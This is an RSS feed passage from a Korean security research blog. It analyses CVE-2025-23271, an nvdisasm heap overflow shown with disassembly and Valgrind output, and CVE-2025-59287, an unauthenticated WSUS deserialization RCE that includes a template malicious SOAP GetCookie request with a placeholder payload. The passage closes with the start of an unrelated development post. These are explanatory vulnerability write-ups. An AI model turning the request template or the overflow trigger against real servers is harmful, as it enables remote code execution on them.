class="hljs-number">0045</span>c729  add     rsi, <span class="hljs-number">0x1</span>                    <span class="hljs-number">0045</span>c72d  add     rdx, <span class="hljs-number">0x20</span>                   <span class="hljs-number">0045</span>c731  add     rax, <span class="hljs-number">0x40</span>                   (<span class="hljs-number">4</span>)...<span class="hljs-number">0045</span>c79d  movups  xmmword [rax<span class="hljs-number">-0x30</span>], xmm5    (<span class="hljs-number">5.</span>a)<span class="hljs-number">0045</span>c7a1  movups  xmmword [rax<span class="hljs-number">-0x40</span>], xmm1    (<span class="hljs-number">5.b</span>)...<span class="hljs-number">0045</span>c7b1  movups  xmmword [rax<span class="hljs-number">-0x10</span>], xmm4    (<span class="hljs-number">5.</span>c)<span class="hljs-number">0045</span>c7b5  movups  xmmword [rax<span class="hljs-number">-0x20</span>], xmm1    (<span class="hljs-number">5.</span>d)<span class="hljs-number">0045</span>c7b9  cmp     rdi, rsi<span class="hljs-number">0045</span>c7bc  ja      <span class="hljs-number">0x45c720</span></code></pre><p>&#xC774;&#xD6C4; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xD1B5;&#xD574; AVX &#xC154;&#xD50C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xB370; (4),(5.a)~(5.d)&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xB418;&#xB294; heap &#xC601;&#xC5ED;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; rax&#xAC00; 0x40&#xC529; &#xC99D;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">buffer_size = (sh_size &gt;&gt; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span>loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span>assumed_size = loop_counter * <span class="hljs-number">0x40</span></code></pre><p>&#xC55E;&#xC11C; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; heap size&#xC640; &#xBC18;&#xBCF5;&#xBB38; &#xD69F;&#xC218;&#xB97C; &#xAD6C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC2DC; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, &#xD2B9;&#xC815; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; assumed_size&#xAC00; buffer_size &#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">sh_size: <span class="hljs-number">0x19</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1a</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1b</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1c</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1d</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1e</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1f</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x39</span>, buffer size: <span class="hljs-number">0x70</span>, assumed size: <span class="hljs-number">0x80</span>...</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158; <code>sh_size</code> &#xAC12;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD574; heap overflow&#xB85C; &#xC778;&#xD574; RCE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">==<span class="hljs-number">152542</span>== Memcheck, a memory error detector==152542== Copyright (C) 2002-2024, and GNU GPL&apos;d, by Julian Seward et al. ==<span class="hljs-number">152542</span>== Using Valgrind<span class="hljs-number">-3.23</span><span class="hljs-number">.0</span> <span class="hljs-keyword">and</span> LibVEX; rerun with -h <span class="hljs-keyword">for</span> copyright info==<span class="hljs-number">152542</span>== Command: ./nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span> ./ac0bcb07==<span class="hljs-number">152542</span>== Parent PID: <span class="hljs-number">132852</span>==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== Invalid write of size <span class="hljs-number">8</span>==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x45C7B1</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>==  Address <span class="hljs-number">0x4a99368</span> is <span class="hljs-number">0</span> bytes after a block of size <span class="hljs-number">184</span> alloc<span class="hljs-number">&apos;</span>d==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x484680F</span>: <span class="hljs-built_in">malloc</span> (vg_replace_malloc.c:<span class="hljs-number">446</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x465719</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40A999</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45C6AD</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== HEAP SUMMARY:==<span class="hljs-number">152542</span>==     in use at <span class="hljs-built_in">exit</span>: <span class="hljs-number">24</span>,<span class="hljs-number">556</span> bytes in <span class="hljs-number">154</span> blocks==<span class="hljs-number">152542</span>==   total heap usage: <span class="hljs-number">228</span> allocs, <span class="hljs-number">74</span> frees, <span class="hljs-number">39</span>,<span class="hljs-number">566</span> bytes allocated==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== LEAK SUMMARY:==<span class="hljs-number">152542</span>==    definitely lost: <span class="hljs-number">248</span> bytes in <span class="hljs-number">8</span> blocks==<span class="hljs-number">152542</span>==    indirectly lost: <span class="hljs-number">8</span>,<span class="hljs-number">062</span> bytes in <span class="hljs-number">123</span> blocks==<span class="hljs-number">152542</span>==      possibly lost: <span class="hljs-number">16</span>,<span class="hljs-number">246</span> bytes in <span class="hljs-number">23</span> blocks==<span class="hljs-number">152542</span>==    still reachable: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>==         suppressed: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>== Rerun with --leak-check=full to see details of leaked memory==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== For lists of detected <span class="hljs-keyword">and</span> suppressed errors, rerun with: -s==<span class="hljs-number">152542</span>== ERROR SUMMARY: <span class="hljs-number">2</span> errors from <span class="hljs-number">1</span> contexts (suppressed: <span class="hljs-number">0</span> from <span class="hljs-number">0</span>)</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/NVIDIA/">NVIDIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/nvdisasm/">nvdisasm</category>
      
      <category domain="https://hackyboiz.github.io/tags/ELF/">ELF</category>
      
      <category domain="https://hackyboiz.github.io/tags/reloc/">.reloc</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-59287: WSUS(Windows Server Update Services)의 인증되지 않은 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</link>
      <guid>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</guid>
      <pubDate>Sun, 02 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerabili</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>WSUS&#xAC00; &#xC124;&#xCE58; &#xBC0F; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC11C;&#xBC84;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;</p><ul><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server 2022</li><li>Windows Server 2025</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Server Update Services(WSUS)&#xB294; &#xAE30;&#xC5C5; &#xD658;&#xACBD;&#xC5D0;&#xC11C; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC758; &#xC2B9;&#xC778;, &#xBC30;&#xD3EC;, &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xC744; &#xC911;&#xC559;&#xC5D0;&#xC11C; &#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xC778;&#xD504;&#xB77C; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. CVE-2025-59287&#xC740; WSUS&#xC758; &#xC6F9; &#xBCF4;&#xACE0;&amp;&#xAD00;&#xB9AC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xB41C; &#xC9C1;&#xB82C;&#xD654;(serialized) &#xB370;&#xC774;&#xD130;&#xB97C; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; .NET &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;(deserialization)&#xB97C; &#xC218;&#xD589;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; GetCookie() &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC804;&#xC1A1;&#xB41C; AuthorizationCookie &#xAC1D;&#xCCB4;&#xC758; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. WSUS&#xC758; <code>Microsoft.UpdateServices.Internal.Authorization.EncryptionHelper.DecryptData()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCDA9;&#xBD84;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xC5EC; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">else</span>{    BinaryFormatter binaryFormatter = <span class="hljs-keyword">new</span> BinaryFormatter();    MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(<span class="hljs-built_in">array</span>);    <span class="hljs-keyword">try</span>    {        obj = binaryFormatter.Deserialize(memoryStream); <span class="hljs-comment">// [1]</span>    }    <span class="hljs-keyword">catch</span> (Exception ex2)    <span class="hljs-comment">// ...</span>    <span class="hljs-keyword">if</span> (obj.GetType() != <span class="hljs-keyword">this</span>.classType) <span class="hljs-comment">// [2]</span>    {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> LoggedArgumentException(<span class="hljs-string">&quot;Decrypted cookie has the wrong data type. Expected type = &quot;</span> + <span class="hljs-keyword">this</span>.classType.ToString() + <span class="hljs-string">&quot;, actual type = &quot;</span> + obj.GetType().ToString(), <span class="hljs-string">&quot;cookieData&quot;</span>);    }}<span class="hljs-keyword">return</span> obj;</code></pre><p>[1] &#xC704; &#xACFC;&#xC815;&#xC740; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xCFE0;&#xD0A4; &#xBC14;&#xC774;&#xD2B8;(array)&#xB97C; MemoryStream&#xC5D0; &#xB2F4;&#xC544; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; [2] &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;&#xAC00; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; <code>soserial.net</code>&#xACFC; &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB85C; &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; <code>BinaryFormatter</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB420; &#xB54C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC545;&#xC6A9;&#xC740; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><p>&#xCDE8;&#xC57D;&#xC810; &#xD750;&#xB984;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) &#xC870;&#xC791;&#xB41C; SOAP &#xC694;&#xCCAD; &#xC804;&#xC1A1;</p><p>&#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; WSUS&#xC758; SOAP&#xC758; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; <code>/ClientWebService/Client.asmx</code> &#xB85C; &#xC870;&#xC791;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC694;&#xCCAD; &#xD5E4;&#xB354;&#xC5D0;&#xB294; <code>SOAPAction: &#x201C;&#x2026;/GetCookie&quot;</code> &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">POST /ClientWebService/Client.asmx HTTP/<span class="hljs-number">1.1</span>Host: WSUS-SERVER:<span class="hljs-number">8530</span>Content-Type: text/xml; charset=utf<span class="hljs-number">-8</span>SOAPAction: <span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie&quot;</span>Content-Length: <span class="hljs-number">3632</span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;  &lt;soap:Body&gt;    &lt;GetCookie xmlns=<span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService&quot;</span>&gt;      &lt;authCookies&gt;        &lt;AuthorizationCookie&gt;          &lt;PlugInId&gt;SimpleTargeting&lt;/PlugInId&gt;          &lt;CookieData&gt;[GENERATED PAYLOAD]&lt;/CookieData&gt;        &lt;/AuthorizationCookie&gt;      &lt;/authCookies&gt;      &lt;oldCookie xsi:nil=<span class="hljs-string">&quot;true&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>/&gt;      &lt;protocolVersion&gt;1.20&lt;/protocolVersion&gt;    &lt;/GetCookie&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre><p>2) AuthorizationCookie &#xC548;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC0BD;&#xC785;</p><p>&#xC694;&#xCCAD;&#xC758; &#xBCF8;&#xBB38;&#xC5D0; <code>AuthorizationCookie</code>&#xC758; <code>CookieData</code> &#xD544;&#xB4DC;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; Base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD6C4; AES-128-CBC&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p><p>3) &#xC11C;&#xBC84;&#xC758; &#xC694;&#xCCAD; &#xC218;&#xC2E0; &#x2192; &#xCC98;&#xB9AC;</p><p>&#xD574;&#xB2F9; &#xC694;&#xCCAD;&#xC740; <code>AuthorizationManager.GetCookie</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>CrackAuthorizationCookies</code> &#x2192; <code>CrackAuthorizationCookie</code> &#xD638;&#xCD9C; &#xACBD;&#xB85C;&#xB97C; &#xB530;&#xB77C; <code>EncryptionHelper.DecryptData()</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>4) &#xBCF5;&#xD638;&#xD654; &#xB2E8;&#xACC4;</p><p>DecryptData()&#xB294; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; AES&#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>5) &#xC5ED;&#xC9C1;&#xB82C;&#xD654;</p><p>&#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB294; <code>MemoryStream</code>&#xC73C;&#xB85C; &#xAC10;&#xC2F8;&#xC838; &#xBC14;&#xB85C; <code>BinaryFormatter.Deserialize()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; <code>BinaryFormatter</code>&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xBCF5;&#xC6D0;&#xD558;&#xACE0; &#xC0DD;&#xC131;&#xC790;, <code>ISerializable</code> &#xD6C4;&#xD06C;&#xB7;<code>OnDeserialized</code> &#xAC19;&#xC740; &#xCF5C;&#xBC31;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; obj.GetType()&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBBC0;&#xB85C;, &#xC774;&#xBBF8; &#xC77C;&#xC5B4;&#xB09C; &#xC545;&#xC131; &#xB3D9;&#xC791;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p>6) &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xC2E4;&#xD589; &#x2192; RCE</p><p>&#xACF5;&#xACA9;&#xC790;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xC11C;&#xBC84;&#xC758; &#xAC00;&#xC82F;&#xCCB4;&#xC778;&#xC744; &#xC545;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74;,<br>WSUS &#xD504;&#xB85C;&#xC138;&#xC2A4;(<code>wsusservice.exe</code> &#xB610;&#xB294; <code>w3wp.exe</code>)&#xAC00; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; PoC&#xB294; &#xCC3E;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h3><p>Microsoft&#xB294; CVE-2025-59287&#xACFC; &#xAD00;&#xB828;&#xD55C; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC73C;&#xB098;, &#xCD08;&#xAE30; &#xD328;&#xCE58;&#xAC00; &#xC644;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCD94;&#xAC00; &#xAE34;&#xAE09; &#xD328;&#xCE58;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xACE0; &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xC2DC;&#xB3C4;/&#xC545;&#xC6A9;&#xC774; &#xBCF4;&#xACE0;&#xB418;&#xC5B4; &#xC989;&#xC2DC; &#xD328;&#xCE58; &#xC801;&#xC6A9; &#xBC0F; &#xD3EC;&#xD2B8; &#xC644;&#xD654; &#xC870;&#xCE58;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://socprime.com/blog/cve-2025-59287-detection">https://socprime.com/blog/cve-2025-59287-detection</a></p><p><a href="https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerability">https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerabili</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-59287/">CVE-2025-59287</category>
      
      <category domain="https://hackyboiz.github.io/tags/WSUS/">WSUS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Deserialization/">Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Newbie Developer&#39;s Service Development Journey using AI Services Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</guid>
      <pubDate>Thu, 30 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-What-happened&amp;#x2026;&quot;&gt;&lt;a href=&quot;#0-What-ha</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg" alt="index_img"></p><h1 id="0-What-happened&#x2026;"><a href="#0-What-happened&#x2026;" class="headerlink" title="0. What happened&#x2026;"></a>0. What happened&#x2026;</h1><p>Haha, it&#x2019;s j0ker! Why&#x2019;s it been so long since I last wrote? When was my last post&#x2026; Ah, August&#x2026; Haha&#x2026; Please save me&#x2026; Next time I&#x2019;ll try to write something more interesting&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/joker.png" alt="image.png"></p><p>Today, unlike my previous research posts, I&#x2019;d like to briefly discuss a project I developed.</p><p>On August 30th, the 31st Hacking Camp took place. About two weeks prior, I suddenly received a call from the organizers&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>Well&#x2026; the original presenter suddenly contacted us saying they couldn&#x2019;t make it, so we had to find a replacement. I was planning to go on the second day, listen to the mentee presentations, and then grab drinks with the organizers in the evening&#x2026; but I ended up giving the presentation lol. So I prepared for it and had about a week to spare&#x2026; but I&#x2019;m a pro at creating work for myself, so I wanted to do something extra.</p><h1 id="1-Planning-Begins"><a href="#1-Planning-Begins" class="headerlink" title="1. Planning Begins"></a>1. Planning Begins</h1><p>To give a quick update, I recently co-founded a startup called L0ch and Hacky-AI, where we&#x2019;re developing security solutions. (If you&#x2019;re interested, please visit our <a href="https://hacky-ai.com/">website</a>!) I believe the most crucial aspect of running a startup is identifying customer problems and proposing solutions. There are 